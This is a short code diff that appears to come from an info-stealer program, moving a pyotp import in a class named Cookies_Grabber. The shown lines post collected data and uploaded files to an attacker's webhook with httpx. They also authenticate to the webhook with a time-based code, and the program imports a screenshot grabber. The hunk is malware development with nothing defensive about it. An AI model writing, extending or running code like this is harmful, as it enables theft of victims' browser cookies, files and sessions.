@@ -14,6 +14,7 @@ import threading
 import subprocess
 
 from sys import argv
+from pyotp import TOTP
 from pathlib import Path
 from PIL import ImageGrab
 from struct import unpack
@@ -1003,7 +1004,6 @@ class Cookies_Grabber(functions):
                 httpx.post(self.webhook, json=embed)
                 httpx.post(self.webhook, files={'upload_file': f})
             else:
-                from pyotp import TOTP
                 key = TOTP(self.fetchConf('webhook_protector_key')).now()
                 httpx.post(self.webhook, headers={
                         "Authorization": key}, json=embed)
